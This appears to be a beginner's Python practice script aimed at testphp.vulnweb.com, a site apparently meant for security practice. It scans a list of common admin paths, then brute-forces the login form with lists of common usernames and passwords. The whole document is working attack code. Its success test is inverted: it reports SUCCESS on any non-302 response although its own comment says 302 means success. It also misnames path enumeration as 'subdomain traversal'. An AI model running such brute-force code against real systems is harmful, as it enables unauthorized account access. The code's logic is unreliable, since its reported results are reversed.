# admin page scan (called a subdomain traversal [basically a way to find hidden files and directories])
import requests

base_url = "http://testphp.vulnweb.com/"
paths = ["login", "admin", "admin/home", "admin/login", "cpanel"]
print("[*] Scanning for admin pages...")
for path in paths: # for each path in the paths list, we will try to access the url
    url = base_url + path # each time with different path
    try:
        r = requests.get(url) # try to access the url
        if r.status_code == 200: # if the status code is 200, then the page is found
            print(f"[+] Found: {url}")
        else:
            print(f"[-] Not found: {url}")
    except:
        print(f"[!] Error trying to access: {url}")

# brute force attack
import requests
url = "http://testphp.vulnweb.com/userinfo.php" # url to attack (login page)

usernames = ["admin", "test", "root", "user", "guest"]
passwords = ["1234", "admin", "password", "test", "letmein", "123456"]

print("\n[*] Starting brute-force attack on testphp.vulnweb.com...\n")
for uname in usernames: # for each username in the usernames list, we will try to access the url
    for pword in passwords: # for each password in the passwords list, we will try to access the url
        data = { # data to send to the url (payload)
            "uname": uname,
            "pass": pword
        }
        response = requests.post(url, data=data, allow_redirects=False) # send the data to the url

        if response.status_code != 302: # 302 = redirect (usually means the login was successful)
            print(f"[+] SUCCESS: {uname}:{pword}")
        else:
            print(f"[-] FAIL: {uname}:{pword}")
